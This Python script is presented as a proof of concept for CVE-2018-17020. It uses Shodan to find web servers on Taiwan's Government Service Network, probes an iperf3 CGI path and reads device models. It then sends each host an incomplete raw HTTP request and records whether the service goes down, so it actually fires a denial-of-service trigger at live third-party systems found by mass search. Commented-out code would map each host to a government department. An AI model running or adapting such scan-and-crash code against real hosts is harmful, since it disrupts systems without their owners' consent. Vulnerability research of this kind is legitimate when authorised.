"""Module Proof of Concept for CVE-2018-17020."""
import os
import socket

import pandas as pd
import requests

import helper.function as func
import helper.http_validator as http
from package.ip2gov_adapter import Ip2govAdapter
from package.shodan_adapter import ShodanAdapter

ACCESSIBLE_CODES = [200, 401]


def get_response_code(url):
    try:
        headers = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'
        }
        # ignore verifying the SSL certificate
        response = requests.get(url,
                                headers=headers,
                                allow_redirects=True,
                                verify=False,
                                timeout=5)
        return response.status_code
    except Exception as e:
        print(e)
        return False


def is_accessible(request_url):
    """Function confirm that web field is accessible."""
    code = get_response_code(request_url)
    if code not in ACCESSIBLE_CODES:
        return False

    return True


if __name__ == '__main__':

    ip2gov = Ip2govAdapter()
    sa = ShodanAdapter()

    path_to_csv = os.path.join(os.path.dirname(__file__), "data",
                               "use_cve_2023_20198.csv")

    search_filters = {
        'country': 'tw',
        'org': 'Government Service Network (GSN)',
        'all': 'HTTP/1.0 200 OK Server: httpd/2.0',
    }

    match_fields = [
        {
            'label': 'ip',
            'field': 'ip_str'
        },
        {
            'label': 'port',
            'field': 'port'
        },
        {
            'label': 'product',
            'field': 'product'
        },
        {
            'label': 'ssl',
            'field': 'ssl'
        },
        {
            'label': 'module',
            'field': 'module'
        },
    ]

    fields = sa.basic_query(search_filters, match_fields)
    print(fields)

    IPERF3_PATH = 'set_iperf3_svr.cgi'
    output = []
    for field in fields:
        EXPLOITABLE = False
        IPERF3_RESOURCE = False
        #DEPARTMENT = None
        #DEPARTMENT_CLASS = None
        #ACC = None
        MODEL_NAME = None

        host = field['ip']
        port = field['port']

        if field['ssl'] is None:
            field['ssl'] = False
            url = f"http://{host}:{port}"
        else:
            field['ssl'] = True
            url = f"https://{host}:{port}"

        field['url'] = url
        print(host, port, url)

        #gov_data = ip2gov.get_gov_data_by_ip(field['ip'])
        #if gov_data:
        #    DEPARTMENT = gov_data.get('DEP')
        #    DEPARTMENT_CLASS = gov_data.get('Class')
        #    ACC = gov_data.get('ACC')

        # check 1
        IPERF3_RESOURCE = is_accessible(f"{url}/{IPERF3_PATH}")
        IPERF3_RESOURCE_CODE = get_response_code(f"{url}/{IPERF3_PATH}")

        FIRST_VISIT = is_accessible(url)
        print(f"first_visit: {FIRST_VISIT}")

        if not FIRST_VISIT:
            print("early drop")
            output.append(
                    field | \
            #        {'department': DEPARTMENT} | \
            #        {'acc': ACC} | \
            #        {'class': DEPARTMENT_CLASS} | \
                    {'cve-2018-17020': EXPLOITABLE} | \
                    {'found_iperf3_cgi': IPERF3_RESOURCE} | \
                    {'http_code_of_iperf3_cgi': IPERF3_RESOURCE_CODE} | \
                    {'model_name': MODEL_NAME}
            )
            continue

        path = http.get_js_redirect_url(url)
        login_url = f"{url}{path}"
        print(login_url)
        DIV_CLASS = "prod_madelName"
        html_doc = http.get_response_body(login_url)
        MODEL_NAME = http.find_text_on_divs(html_doc, DIV_CLASS)

        # check 2
        print('start socket')
        # Create a socket object
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the server
        client_socket.connect((host, port))

        # Prepare the raw HTTP request
        HTTP_REQUEST = 'GET / HTTP/1.1\r\n'

        # Send the request to the server
        print(f"send request: {HTTP_REQUEST}")
        client_socket.send(HTTP_REQUEST.encode())

        SECOND_VISIT = is_accessible(url)
        print(f"second_visit: {SECOND_VISIT}")

        if SECOND_VISIT:
            print("exploitable: False")
        else:
            EXPLOITABLE = True
            print("exploitable: True")

        # Close the socket
        client_socket.close()
        print('close socket')

        output.append(
                field | \
        #        {'department': DEPARTMENT} | \
        #        {'acc': ACC} | \
        #        {'class': DEPARTMENT_CLASS} | \
                {'cve-2018-17020': EXPLOITABLE} | \
                {'found_iperf3_cgi': IPERF3_RESOURCE} | \
                {'http_code_of_iperf3_cgi': IPERF3_RESOURCE_CODE} | \
                {'model_name': MODEL_NAME}
        )

    output_dict = func.arr_dict_to_flat_dict(output)
    df = pd.DataFrame(output_dict)
    path_to_csv = os.path.join(os.path.dirname(__file__), "data",
                               "use_cve_2018_17020.csv")
    df.to_csv(path_to_csv, index=False, encoding='utf-8-sig')
